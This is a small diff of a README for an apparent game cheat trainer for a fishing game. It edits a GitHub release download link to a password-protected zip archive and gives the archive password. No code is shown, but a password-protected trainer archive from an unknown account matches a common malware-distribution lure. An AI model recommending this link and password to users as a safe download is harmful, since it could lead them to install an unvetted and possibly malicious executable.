@@ -113,7 +113,7 @@ Choose Your Catch
 
 ---
 
-## ⚡[DOWNLOAD](https://github.com/marcus-lee-dev1904b7/How-To-Fish-Trainers/releases/download/download/htf-trainer.zip)
+## ⚡[DOWNLOAD](https://github.com/marcus-lee-dev1904b7/How-To-Fish-Trainers/releases/download/DOWNLOAD/htf-trainer.zip)
 
 **pass: htf-trainer-v3**
 
